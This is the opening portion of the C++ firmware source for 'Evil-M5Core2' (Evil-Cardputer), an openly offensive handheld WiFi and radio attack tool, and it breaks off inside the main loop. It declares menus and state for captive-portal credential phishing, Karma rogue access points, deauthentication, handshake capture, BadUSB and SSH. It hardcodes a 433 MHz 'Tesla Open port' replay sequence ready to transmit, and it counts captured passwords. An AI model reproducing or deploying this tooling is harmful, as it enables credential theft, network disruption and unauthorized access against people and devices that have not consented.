/*
   Evil-M5Core2 - WiFi Network Testing and Exploration Tool

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2
   assumes no liability and is not responsible for any misuse or damage caused by this tool.
   Users are required to comply with all applicable laws and regulations in their jurisdiction
   regarding network testing and ethical hacking.
*/
// remember to change hardcoded password and configuration below in the code to ensure no unauthorized access : !!!!!! CHANGE THIS !!!!!
// no bluetooth serial due to only BLE

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <M5Unified.h>
#include <vector>
#include <string>
#include <set>
#include <TinyGPSPlus.h>
#include <Adafruit_NeoPixel.h> //led
#include "M5Cardputer.h"
#include <ArduinoJson.h>
#include "BLEDevice.h"

#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>

#include <esp_task_wdt.h>

#include <HTTPClient.h>
#include <WiFiClientSecure.h>
#include <WiFiClient.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

//deauth
#include "esp_wifi_types.h"
#include "esp_event_loop.h"
//deauth end

//sniff and deauth client
#include "esp_err.h"
#include "nvs_flash.h"
#include <map>
#include <algorithm>
#include <regex>
//sniff and deauth client end



String scanIp = "";
#include <lwip/etharp.h>
#include <lwip/ip_addr.h>
#include <ESPping.h>

//ssh
#include "libssh_esp32.h"
#include <libssh/libssh.h>

//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
String ssh_user = "";
String ssh_host = "";
String ssh_password = "";
int ssh_port = 22;
//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!


// SSH session and channel
ssh_session my_ssh_session;
ssh_channel my_channel;
//ssh end



extern "C" {
#include "esp_wifi.h"
#include "esp_system.h"
}

bool ledOn = true;// change this to true to get cool led effect (only on fire)
bool soundOn = true;

static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_4;

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

int currentIndex = 0, lastIndex = -1;
bool inMenu = true;
const char* menuItems[] = {
    "Scan WiFi",
    "Select Network",
    "Clone & Details",
    "Set Wifi SSID",
    "Set Wifi Password",
    "Set Mac Address",
    "Start Captive Portal",
    "Stop Captive Portal",
    "Change Portal",
    "Check Credentials",
    "Delete All Creds",
    "Monitor Status",
    "Probe Attack",
    "Probe Sniffing",
    "Karma Attack",
    "Karma Auto",
    "Karma Spear",
    "Select Probe",
    "Delete Probe",
    "Delete All Probes",
    "Settings",
    "Wardriving",
    "Beacon Spam",
    "Deauther",
    "Client Sniffing and Deauth",
    "Handshake/Deauth Sniffing",
    "Check Handshakes",
    "Wall Of Flipper",
    "Send Tesla Code",
    "Connect to network",
    "SSH Shell",
    "Scan IP Ports",
    "Scan Network Hosts",
    "Web Crawler",
    "PwnGrid Spam",
    "Skimmer Detector",
    "BadUSB"
};
const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);

const int maxMenuDisplay = 9;
int menuStartIndex = 0;

String ssidList[100];
int numSsid = 0;
bool isOperationInProgress = false;
int currentListIndex = 0;
String clonedSSID = "Evil-Cardputer";
int topVisibleIndex = 0;

// Connect to nearby wifi network automaticaly ro provide internet to the core2 you can be connected and provide AP at same time
//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
const char* ssid = ""; // ssid to connect,connection skipped at boot if stay blank ( can be shutdown by different action like probe attack)
const char* password = ""; // wifi password
//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
// password for web access to remote check captured credentials and send new html file !!!!!! CHANGE THIS !!!!!
const char* accessWebPassword = "7h30th3r0n3"; // !!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!

String portalFiles[30]; // 30 portals max
int numPortalFiles = 0;
String selectedPortalFile = "/sites/normal.html"; // defaut portal
int portalFileIndex = 0;


int nbClientsConnected = 0;
int nbClientsWasConnected = 0;
int nbPasswords = 0;
bool isCaptivePortalOn = false;


String macAddresses[10]; // 10 mac address max
int numConnectedMACs = 0;

File fsUploadFile; // global variable for file upload

String captivePortalPassword = "";

// Probe Sniffind part

#define MAX_SSIDS_Karma 200

char ssidsKarma[MAX_SSIDS_Karma][33];
int ssid_count_Karma = 0;
bool isScanningKarma = false;
int currentIndexKarma = -1;
int menuStartIndexKarma = 0;
int menuSizeKarma = 0;
const int maxMenuDisplayKarma = 12;

enum AppState {
  StartScanKarma,
  ScanningKarma,
  StopScanKarma,
  SelectSSIDKarma
};

AppState currentStateKarma = StartScanKarma;

bool isProbeSniffingMode = false;
bool isProbeKarmaAttackMode = false;
bool isKarmaMode = false;

// Probe Sniffing end

// AutoKarma part

volatile bool newSSIDAvailable = false;
char lastSSID[33] = {0};
const int autoKarmaAPDuration = 15000; // Time for Auto Karma Scan can be ajusted if needed consider only add time(Under 10s to fast to let the device check and connect to te rogue AP)
bool isAutoKarmaActive = false;
bool isWaitingForProbeDisplayed = false;
unsigned long lastProbeDisplayUpdate = 0;
int probeDisplayState = 0;
static bool isInitialDisplayDone = false;
char lastDeployedSSID[33] = {0};
bool karmaSuccess = false;
//AutoKarma end

//config file
const char* configFolderPath = "/config";
const char* configFilePath = "/config/config.txt";
int defaultBrightness = 255 * 0.35; //  35% default Brightness
String selectedStartupImage = "/img/startup-cardputer.jpg"; // Valeur par défaut
String selectedStartupSound = "/audio/sample.mp3"; // Valeur par défaut

std::vector<std::string> whitelist;
std::set<std::string> seenWhitelistedSSIDs;
//config file end


//led part

#define PIN 21
//#define PIN 25 // for M5Stack Core AWS comment above and uncomment this line
#define NUMPIXELS 1

Adafruit_NeoPixel pixels = Adafruit_NeoPixel(NUMPIXELS, PIN, NEO_GRB);
int delayval = 100;


void setColorRange(int startPixel, int endPixel, uint32_t color) {
  for (int i = startPixel; i <= endPixel; i++) {
    pixels.setPixelColor(i, color);
  }
  pixels.show();
  delay(30);
}

//led part end

bool isItSerialCommand = false;


// deauth and pwnagotchi detector part
const long channelHopInterval = 5000; // hoppping time interval
unsigned long lastChannelHopTime = 0;
int currentChannelDeauth = 1;
bool autoChannelHop = false; // Commence en mode auto
int lastDisplayedChannelDeauth = -1;
bool lastDisplayedMode = !autoChannelHop; // Initialisez à l'opposé pour forcer la première mise à jour
unsigned long lastScreenClearTime = 0; // Pour suivre le dernier effacement de l'écran
char macBuffer[18];
int maxChannelScanning = 13;

int nombreDeHandshakes = 0; // Nombre de handshakes/PMKID capturés
int nombreDeDeauth = 0;
int nombreDeEAPOL = 0;
File pcapFile;
// deauth and pwnagotchi detector end

// Sniff and deauth clients
std::map<std::string, std::vector<std::string>> connections;
std::map<std::string, std::string> ap_names;
std::set<int> ap_channels;
std::map<std::string, int> ap_channels_map;

//If you change these value you need to change it also in the code on deauthClients function
unsigned long lastScanTime = 0;
unsigned long scanInterval = 90000; // interval of deauth and scanning network

unsigned long lastChannelChange = 0;
unsigned long channelChangeInterval = 15000; // interval of channel switching

unsigned long lastClientPurge = 0;
unsigned long clientPurgeInterval = 300000; //interval of clearing the client to exclude no more connected client or ap that not near anymore

unsigned long deauthWaitingTime = 5000; //interval of time to capture EAPOL after sending deauth frame
static unsigned long lastPrintTime = 0;

int nbDeauthSend = 10;

bool isDeauthActive = false;
bool isDeauthFast = false;

// Sniff and deauth clients end

//Send Tesla code
#include <driver/rmt.h>

#define RF433TX

#define RMT_TX_CHANNEL  RMT_CHANNEL_0
#define RTM_BLOCK_NUM   1

#define RMT_CLK_DIV   80 /*!< RMT counter clock divider */
#define RMT_1US_TICKS (80000000 / RMT_CLK_DIV / 1000000)

rmt_item32_t rmtbuff[2048];

const uint8_t signalPin = 2;                   // Pin de sortie pour le signal
const uint16_t pulseWidth = 400;                // Microseconds
const uint16_t messageDistance = 23;            // Millis
const uint8_t transmissions = 6;                // Number of repeated transmissions
const uint8_t messageLength = 43;

//Tesla Open port sequence
const uint8_t sequence[messageLength] = {
  0x02, 0xAA, 0xAA, 0xAA, // Preamble of 26 bits by repeating 1010
  0x2B,                 // Sync byte
  0x2C, 0xCB, 0x33, 0x33, 0x2D, 0x34, 0xB5, 0x2B, 0x4D, 0x32, 0xAD, 0x2C, 0x56, 0x59, 0x96, 0x66,
  0x66, 0x5A, 0x69, 0x6A, 0x56, 0x9A, 0x65, 0x5A, 0x58, 0xAC, 0xB3, 0x2C, 0xCC, 0xCC, 0xB4, 0xD2,
  0xD4, 0xAD, 0x34, 0xCA, 0xB4, 0xA0
};

//Send Tesla code end


TinyGPSPlus gps;
HardwareSerial cardgps(2); // Create a HardwareSerial object on UART2

//webcrawling
void webCrawling(const String &urlOrIp = "");
void webCrawling(const IPAddress &ip);
//webcrawling end


//taskbar
M5Canvas taskBarCanvas(&M5.Display); // Framebuffer pour la barre de tâches
//taskbar end



//badusb

#include <USBHIDKeyboard.h>
#include <USB.h>
#include <functional>
#define DEF_DELAY 50

USBHIDKeyboard Kb;
bool kbChosen = false;
//badusb end



//mp3

#include <AudioOutput.h>
#include <AudioFileSourceSD.h>
#include <AudioFileSourceID3.h>
#include <AudioGeneratorMP3.h>

// Classe AudioOutputM5Speaker spécifique à votre projet
class AudioOutputM5Speaker : public AudioOutput {
public:
    AudioOutputM5Speaker(m5::Speaker_Class* m5sound, uint8_t virtual_sound_channel = 0) {
        _m5sound = m5sound;
        _virtual_ch = virtual_sound_channel;
    }
    virtual ~AudioOutputM5Speaker(void) {};
    virtual bool begin(void) override { return true; }
    virtual bool ConsumeSample(int16_t sample[2]) override {
        if (_tri_buffer_index < tri_buf_size) {
            _tri_buffer[_tri_index][_tri_buffer_index  ] = sample[0];
            _tri_buffer[_tri_index][_tri_buffer_index+1] = sample[1];
            _tri_buffer_index += 2;
            return true;
        }
        flush();
        return false;
    }
    virtual void flush(void) override {
        if (_tri_buffer_index) {
            _m5sound->playRaw(_tri_buffer[_tri_index], _tri_buffer_index, hertz, true, 1, _virtual_ch);
            _tri_index = _tri_index < 2 ? _tri_index + 1 : 0;
            _tri_buffer_index = 0;
        }
    }
    virtual bool stop(void) override {
        flush();
        _m5sound->stop(_virtual_ch);
        return true;
    }

protected:
    m5::Speaker_Class* _m5sound;
    uint8_t _virtual_ch;
    static constexpr size_t tri_buf_size = 640;
    int16_t _tri_buffer[3][tri_buf_size];
    size_t _tri_buffer_index = 0;
    size_t _tri_index = 0;
};

// Initialisation des objets pour la lecture audio
static AudioFileSourceSD file;
static AudioOutputM5Speaker out(&M5.Speaker);
static AudioGeneratorMP3 mp3;
static AudioFileSourceID3* id3 = nullptr;

// Fonction pour arrêter la lecture
void stop(void) {
    if (id3 == nullptr) return;
    out.stop();
    mp3.stop();
    id3->close();
    file.close();
    delete id3;
    id3 = nullptr;
}

// Fonction pour lire un fichier MP3
void play(const char* fname) {
    if (id3 != nullptr) { stop(); }
    file.open(fname);
    id3 = new AudioFileSourceID3(&file);
    id3->open(fname);
    mp3.begin(id3, &out);
}


//mp3 end

void setup() {
  M5.begin();
  Serial.begin(115200);
  M5.Lcd.setRotation(1);
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setTextFont(1);
  pinMode(signalPin, OUTPUT);
  digitalWrite(signalPin, LOW);
  taskBarCanvas.createSprite(M5.Display.width(), 12); // Créer un framebuffer pour la barre de tâches
  const char* startUpMessages[] = {
    "  There is no spoon...",
    "    Hack the Planet!",
    " Accessing Mainframe...",
    "    Cracking Codes...",
    "Decrypting Messages...",
    "Infiltrating the Network.",
    " Bypassing Firewalls...",
    "Exploring the Deep Web...",
    "Launching Cyber Attack...",
    " Running Stealth Mode...",
    "   Gathering Intel...",
    "     Shara Conord?",
    " Breaking Encryption...",
    "Anonymous Mode Activated.",
    " Cyber Breach Detected.",
    "Initiating Protocol 47...",
    " The Gibson is in Sight.",
    "  Running the Matrix...",
    "Neural Networks Syncing..",
    "Quantum Algorithm started",
    "Digital Footprint Erased.",
    "   Uploading Virus...",
    "Downloading Internet...",
    "  Root Access Granted.",
    "Cyberpunk Mode: Engaged.",
    "  Zero Days Exploited.",
    "Retro Hacking Activated.",
    " Firewall: Deactivated.",
    "Riding the Light Cycle...",
    "  Engaging Warp Drive...",
    "  Hacking the Holodeck..",
    "  Tracing the Nexus-6...",
    "Charging at 2,21 GigaWatt",
    "  Loading Batcomputer...",
    "  Accessing StarkNet...",
    "  Dialing on Stargate...",
    "   Activating Skynet...",
    " Unleashing the Kraken..",
    " Accessing Mainframe...",
    "   Booting HAL 9000...",
    " Death Star loading ...",
    " Initiating Tesseract...",
    "  Decrypting Voynich...",
    "   Hacking the Gibson...",
    "   Orbiting Planet X...",
    "  Accessing SHIELD DB...",
    " Crossing Event Horizon.",
    " Dive in the RabbitHole.",
    "   Rigging the Tardis...",
    " Sneaking into Mordor...",
    "Manipulating the Force...",
    "Decrypting the Enigma...",
    "Jacking into Cybertron..",
    "  Casting a Shadowrun...",
    "  Navigating the Grid...",
    " Surfing the Dark Web...",
    "  Engaging Hyperdrive...",
    " Overclocking the AI...",
    "   Bending Reality...",
    " Scanning the Horizon...",
    " Decrypting the Code...",
    "Solving the Labyrinth...",
    "  Escaping the Matrix...",
    " You know I-Am-Jakoby ?",
    "You know TalkingSasquach?",
    "Redirecting your bandwidth\nfor Leska free WiFi...", // Donation on Ko-fi // Thx Leska !
    "Where we're going We don't\nneed roads   Nefast - 1985",// Donation on Ko-fi // Thx Nefast !
    "Never leave a trace always\n behind you by CyberOzint",// Donation on Ko-fi // Thx CyberOzint !
    "   Injecting hook.worm \nransomware to your android",// Donation on Ko-fi // Thx hook.worm !
    "    You know Kiyomi ?   ", // for collab on Wof
    "           42           ",
    "    Don't be a Skidz !",
    "  Hack,Eat,Sleep,Repeat",
    "   You know Samxplogs ?",
    " For educational purpose",
    "Time to learn something",
    "U Like Karma? Check Mana",
    "   42 because Universe ",
    "Navigating the Cosmos...",
    "Unlocking Stellar Secrets",
    "Galactic Journeys Await..",
    "Exploring Unknown Worlds.",
    "   Charting Star Paths...",
    "   Accessing zone 51... ",
    "Downloading NASA server..",
    "   You know Pwnagotchi ?",
    "   You know FlipperZero?",
    "You know Hash-Monster ?",
    "Synergizing Neuromancer..",
    "Warping Through Cyberspac",
    "Manipulating Quantum Data",
    "Incepting Dreamscapes...",
    "Unlocking Time Capsules..",
    "Rewiring Neural Pathways.",
    "Unveiling Hidden Portals.",
    "Disrupting the Mainframe.",
    "Melding Minds w Machines.",
    "Bending the Digital Rules",
    "   Hack The Planet !!!",
    "Tapping into the Ether...",
    "Writing the Matrix Code..",
    "Sailing the Cyber Seas...",
    "  Reviving Lost Codes...",
    "   HACK THE PLANET !!!",
    " Dissecting DNA of Data",
    "Decrypting the Multiverse",
    "Inverting Reality Matrice",
    "Conjuring Cyber Spells...",
    "Hijacking Time Streams...",
    "Unleashing Digital Demons",
    "Exploring Virtual Vortexe",
    "Summoning Silicon Spirits",
    "Disarming Digital Dragons",
    "Casting Code Conjurations",
    "Unlocking the Ether-Net..",
    " Show me what you got !!!",
    " Do you have good Karma ?",
    "Waves under surveillance!",
    "    Shaking champagne…",
    "Warping with Rick & Morty",
    "       Pickle Rick !!!",
    "Navigating the Multiverse",
    "   Szechuan Sauce Quest.",
    "   Morty's Mind Blowers.",
    "   Ricksy Business Afoot.",
    "   Portal Gun Escapades.",
    "     Meeseeks Mayhem.",
    "   Schwifty Shenanigans.",
    "  Dimension C-137 Chaos.",
    "Cartman's Schemes Unfold.",
    "Stan and Kyle's Adventure",
    "   Mysterion Rises Again.",
    "   Towelie's High Times.",
    "Butters Awkward Escapades",
    "Navigating the Multiverse",
    "    Affirmative Dave,\n        I read you.",
    "  Your Evil-M5Core2 have\n     died of dysentery",
    " Did you disable PSRAM ?",
    "You already star project?",
    "Rick's Portal Gun Activated...",
    "Engaging in Plumbus Assembly...",
    "Wubba Lubba Dub Dub!",
    "Syncing with Meeseeks Box...",
    "Searching for Szechuan Sauce...",
    "Scanning Galactic Federation...",
    "Exploring Dimension C-137...",
    "Navigating the Citadel...",
    "Jerry's Dumb Ideas Detected...",
    "Engaging in Ricksy Business...",
    "Morty's Mind Blowers Loading...",
    "Tuning into Interdimensional Cable...",
    "Hacking into Council of Ricks...",
    "Deploying Mr. Poopybutthole...",
    "Vindicators Assemble...",
    "Snuffles the Smart Dog Activated...",
    "Using Butter Robot...",
    "Evil Morty Schemes Unfolding...",
    "Beth's Cloning Facility Accessed...",
    "Listening to Get Schwifty...",
    "Birdperson in Flight...",
    "Gazorpazorpfield Hates Mondays...",
    "Tampering with Time Crystals...",
    "Engaging Space Cruiser...",
    "Gazorpazorp Emissary Arrived...",
    "Navigating the Cronenberg World...",
    "Using Galactic Federation Currency...",
    "Galactic Adventure Awaits...",
    "Plumbus Maintenance In Progress...",
    "Taming the Dream Inceptors...",
    "Mr. Goldenfold's Nightmare...",
    "Hacking into Unity's Mind...",
    "Beta 7 Assimilation in Progress...",
    "Purging the Planet...",
    "Planet Music Audition...",
    "Hacking into Rick's Safe...",
    "Extracting from Parasite Invasion...",
    "Scanning for Evil Rick...",
    "Preparing for Jerryboree...",
    "Plutonian Negotiations...",
    "Tiny Rick Mode Activated...",
    "Scanning for Cromulons...",
    "Decoding Rick's Blueprints...",
    "Breaking the Fourth Wall...",
    "Jerry's App Idea Rejected...",
    "Galactic Federation Hacked...",
    "Portal Gun Battery Low...",
    "ccessing Anatomy Park...",
    "Interdimensional Travel Commencing...",
    "Vampire Teacher Alert...",
    "Navigating Froopyland...",
    "Synchronizing with Butter Bot...",
    "Unity Connection Established...",
    "Evil Morty Conspiracy...",
    "Listening to Roy: A Life Well Lived...",
    "Galactic Government Overthrown...",
    "Scanning for Gearhead...",
    "Engaging Heist-o-Tron...",
    "Confronting Scary Terry...",
    "Engaging in Squanching...",
    "Learning from Birdperson...",
    "Dimension Hopping Initiated...",
    "Morty Adventure Card Filled...",
    "Engaging Operation Phoenix...",
    "Developing Dark Matter Formula...",
    "Teleporting to Bird World...",
    "Exploring Blips and Chitz...",
    "Synchronizing with Noob Noob...",
    "Plumbus Optimization...",
    "Beth's Self-Discovery Quest...",
    "Extracting from Galactic Prison...",
    "Taming the Zigerion Scammers...",
    "Dimension C-500k Travel...",
    "Sneaking into Birdperson's Wedding...",
    "Preparing Microverse Battery...",
    "Vindicator Call Initiated...",
    "Evil Morty Tracking...",
    "Snuffles' Revolution...",
    "Navigating Abadango Cluster...",
    "Syncing with Phoenix Person...",
    "Stealing from Devil's Antique Shop...",
    "Beth's Horse Surgeon Adventures...",
    "Engaging Purge Planet...",
    "Evil Morty Plans Detected...",
    "Exploring the Thunderdome...",
    "Extracting Toxic Rick...",
    "Tiny Rick Singing...",
    "Birdperson's Memories...",
    "Intergalactic Criminal Record...",
    "Dismantling Unity's Hive Mind...",
    "Engaging with Snuffles...",
    "Exploring Anatomy Park...",
    "Rewiring Rick's Mind...",
    "Scanning for Sleepy Gary...",
    "Navigating the Narnian Box...",
    "Engaging Rick's AI Assistant...",
    "Synchronizing with Beth's Clone...",
    "Preparing for Ricklantis Mixup...",
    "Morty's Science Project...",
    "Portal Gun Malfunction...",
    "Galactic Federation Detected...",
    "Jerry's Misadventures...",
    "Engaging Operation Phoenix...",
    "Scanning for Snowball...",
    "Morty's Science Project...",
    "Evil Morty's Reign...",
    "Navigating Purge Planet...",
    "Rick's Memories Unlocked...",
    "Synchronizing with Tinkles...",
    "Galactic Federation Hacked...",
    "Rick's AI Assistant Activated...",
    "Exploring Zigerion Base...",
    "Beth's Identity Crisis...",
    "Galactic Federation Overthrown...",
    "Scanning for Phoenix Person...",
    "Rick's Safe Hacked...",
    "Morty's Adventure Awaits...",
    "Synchronizing with Snowball...",
    "Evil Morty Conspiracy...",
    "Galactic Adventure Awaits...",
    "Rick's AI Assistant Activated...",
    "Interdimensional Cable Tuning...",
    "Navigating Zigerion Base...",
    "Morty's School Science Project...",
    "Rick's Portal Gun Malfunction...",
    "Engaging Ricklantis Mixup...",
    "Galactic Federation Hacked...",
    "Beth's Clone Identified...",
    "Synchronizing with Phoenix Person...",
    "Galactic Government Overthrown...",
    "Listening to Get Schwifty...",
    "Rick's Safe Hacked...",
    "Morty's Mind Blowers Loaded...",
    "Engaging Galactic Federation...",
    "Scanning for Snowball...",
    "Evil Morty's Reign Initiated...",
    "Navigating Purge Planet...",
    "Synchronizing with Tinkles...",
    "Galactic Federation Hacked...",
    "Rick's Memories Unlocked...",
    "Exploring Zigerion Base...",
    "Beth's Identity Crisis...",
    "Galactic Federation Overthrown...",
    "Scanning for Phoenix Person...",
  };
  const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);

  randomSeed(esp_random());

  int randomIndex = random(numMessages);
  const char* randomMessage = startUpMessages[randomIndex];

  SPI.begin(SCK, MISO, MOSI, -1);
  if (!SD.begin()) {
    Serial.println("Error..");
    Serial.println("SD card not mounted...");
  } else {
    Serial.println("----------------------");
    Serial.println("SD card initialized !! ");
    Serial.println("----------------------");
        // Vérifier et créer le dossier audio s'il n'existe pas
    if (!SD.exists("/audio")) {
        Serial.println("Audio folder not found, creating...");
        if (SD.mkdir("/audio")) {
            Serial.println("Audio folder created successfully.");
        } else {
            Serial.println("Failed to create audio folder.");
        }
    }
    restoreConfigParameter("brightness");
    restoreConfigParameter("ledOn");
    restoreConfigParameter("soundOn");
    restoreConfigParameter("volume");
    loadStartupImageConfig();
    loadStartupSoundConfig(); 
    
    drawImage(selectedStartupImage.c_str());
    if (ledOn) {
      pixels.setPixelColor(0, pixels.Color(255, 0, 0));
      pixels.show();
    }
    if (soundOn) {
        play(selectedStartupSound.c_str());
        while(mp3.isRunning()) {
            if (!mp3.loop()) {
                mp3.stop();
            } else {
                delay(1);
            }
        }
    }else{
    delay(2000);
  }
  }

  /*String batteryLevelStr = getBatteryLevel();
    int batteryLevel = batteryLevelStr.toInt();

    if (batteryLevel < 15) {
    drawImage("/img/low-battery.jpg");
    Serial.println("-------------------");
    Serial.println("!!!!Low Battery!!!!");
    Serial.println("-------------------");
    delay(4000);
    }
  */
  int textY = 30;
  int lineOffset = 10;
  int lineY1 = textY - lineOffset;
  int lineY2 = textY + lineOffset + 30;

  M5.Display.clear();
  M5.Display.drawLine(0, lineY1, M5.Display.width(), lineY1, TFT_WHITE);
  M5.Display.drawLine(0, lineY2, M5.Display.width(), lineY2, TFT_WHITE);

  // Largeur de l'écran
  int screenWidth = M5.Lcd.width();

  // Textes à afficher
  const char* text1 = "Evil-Cardputer";
  const char* text2 = "By 7h30th3r0n3";
  const char* text3 = "v1.2.9 2024";

  // Mesure de la largeur du texte et calcul de la position du curseur
  int text1Width = M5.Lcd.textWidth(text1);
  int text2Width = M5.Lcd.textWidth(text2);
  int text3Width = M5.Lcd.textWidth(text3);

  int cursorX1 = (screenWidth - text1Width) / 2;
  int cursorX2 = (screenWidth - text2Width) / 2;
  int cursorX3 = (screenWidth - text3Width) / 2;

  // Position de Y pour chaque ligne
  int textY1 = textY;
  int textY2 = textY + 20;
  int textY3 = textY + 45;

  // Affichage sur l'écran
  M5.Lcd.setCursor(cursorX1, textY1);
  M5.Lcd.println(text1);

  M5.Lcd.setCursor(cursorX2, textY2);
  M5.Lcd.println(text2);

  M5.Lcd.setCursor(cursorX3, textY3);
  M5.Lcd.println(text3);

  // Affichage en série
  Serial.println("-------------------");
  Serial.println("Evil-Cardputer");
  Serial.println("By 7h30th3r0n3");
  Serial.println("v1.2.9 2024");
  Serial.println("-------------------");
  M5.Display.setCursor(0, textY + 80);
  M5.Display.println(randomMessage);
  Serial.println(" ");
  Serial.println(randomMessage);
  Serial.println("-------------------");
  firstScanWifiNetworks();
  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.show();
    delay(250);
  }

  if (strcmp(ssid, "") != 0) {
    //WiFi.mode(WIFI_MODE_APSTA);
    WiFi.begin(ssid, password);

    unsigned long startAttemptTime = millis();

    while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
      delay(500);
      Serial.println("Trying to connect to Wifi...");
    }

    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("Connected to wifi !!!");
    } else {
      Serial.println("Fail to connect to Wifi or timeout...");
    }
  } else {
    Serial.println("SSID is empty.");
    Serial.println("Skipping Wi-Fi connection.");
    Serial.println("----------------------");
  }

  pixels.begin(); // led init
  cardgps.begin(9600, SERIAL_8N1, 1, -1); // Assurez-vous que les pins RX/TX sont correctement configurées pour votre matériel
  pinMode(signalPin, OUTPUT);
  digitalWrite(signalPin, LOW);
  auto cfg = M5.config();
  M5Cardputer.begin(cfg, true);
  drawMenu();


}



void drawImage(const char *filepath) {
  fs::File file = SD.open(filepath);
  M5.Display.drawJpgFile(SD, filepath);

  file.close();
}


void firstScanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 2000) {
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }

  if (n == 0) {
    Serial.println("No network found ...");
  } else {
    Serial.print(n);
    Serial.println(" Near Wifi Networks : ");
    Serial.println("-------------------");
    numSsid = min(n, 100);
    for (int i = 0; i < numSsid; i++) {
      ssidList[i] = WiFi.SSID(i);
      Serial.print(i);
      Serial.print(": ");
      Serial.println(ssidList[i]);
    }
    Serial.println("-------------------");
  }
}

unsigned long previousMillis = 0;
const long interval = 1000;

void sshConnect(const char *host = nullptr);


unsigned long lastTaskBarUpdateTime = 0;
const long taskBarUpdateInterval = 100; // Mettre à jour chaque seconde
bool pageAccessFlag = false;

int getConnectedPeopleCount() {
  wifi_sta_list_t stationList;
  tcpip_adapter_sta_list_t adapterList;
  esp_wifi_ap_get_sta_list(&stationList);
  tcpip_adapter_get_sta_list(&stationList, &adapterList);
  return stationList.num; // Retourne le nombre de clients connectés
}

int getCapturedPasswordsCount() {
  File file = SD.open("/credentials.txt");
  if (!file) {
    Serial.println("Error opening credentials file for reading");
    return 0;
  }

  int passwordCount = 0;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("-- Password")) {
      passwordCount++;
    }
  }

  file.close();
  return passwordCount;
}

void drawTaskBar() {
  taskBarCanvas.fillRect(0, 0, taskBarCanvas.width(), 10, TFT_NAVY); // Dessiner un rectangle bleu en haut de l'écran
  taskBarCanvas.fillRect(0, 10, taskBarCanvas.width(), 2, TFT_PURPLE); // Dessiner un rectangle bleu en haut de l'écran
  taskBarCanvas.setTextColor(TFT_GREEN);
  
  // Afficher le nombre de personnes connectées
  int connectedPeople = getConnectedPeopleCount();
  taskBarCanvas.setCursor(5, 2); // Positionner à gauche
  taskBarCanvas.print("Sta:" + String(connectedPeople));

  // Afficher le nombre de mots de passe capturés
  int capturedPasswords = getCapturedPasswordsCount();
  taskBarCanvas.setCursor(45, 2); // Positionner après "Sta"
  taskBarCanvas.print("Pwd:" + String(capturedPasswords));
  
  // Afficher l'indicateur de point clignotant pour les accès aux pages et DNS
  static bool dotState = false;
  dotState = !dotState;
  taskBarCanvas.setCursor(87, 2); // Positionner après "Pwd"

  if (pageAccessFlag) {
    taskBarCanvas.print("" + String(dotState ? "■" : " "));
    pixels.setPixelColor(0, pixels.Color(0, 255, 0));
    pixels.show();
    delay(100);
    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.show();
    pageAccessFlag = false; // Réinitialiser le flag après affichage
  } else {
    taskBarCanvas.print("  ");
  }
  
  taskBarCanvas.setCursor(95, 2); // Positionner après "■"
  taskBarCanvas.print("P:" + String(isCaptivePortalOn ? "On" : "Off")); 



  // Afficher le niveau de batterie à droite
  String batteryLevel = getBatteryLevel();
  int batteryWidth = taskBarCanvas.textWidth(batteryLevel + "%");
  taskBarCanvas.setCursor(taskBarCanvas.width() - batteryWidth - 5, 2); // Positionner à droite
  taskBarCanvas.print(batteryLevel + "%");

  // Afficher le framebuffer de la barre de tâches
  taskBarCanvas.pushSprite(0, 0);
}

void loop() {
  M5.update();
  M5Cardputer.update();
  handleDnsRequestSerial();
  unsigned long currentMillis = millis();

  // Mettre à jour la barre de tâches indépendamment du menu
  if (currentMillis - lastTaskBarUpdateTime >= taskBarUpdateInterval && inMenu) {
    drawTaskBar();
    lastTaskBarUpdateTime = currentMillis;
  }

  if (inMenu) {
    if (lastIndex != currentIndex) {
      drawMenu();
      lastIndex = currentIndex;
    }
    handleMenuInput();
  } else {
    switch (currentStateKarma) {
      case StartScanKarma:
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
          startScanKarma();
          currentStateKarma = ScanningKarma;
        }
        break;

      case ScanningKarma:
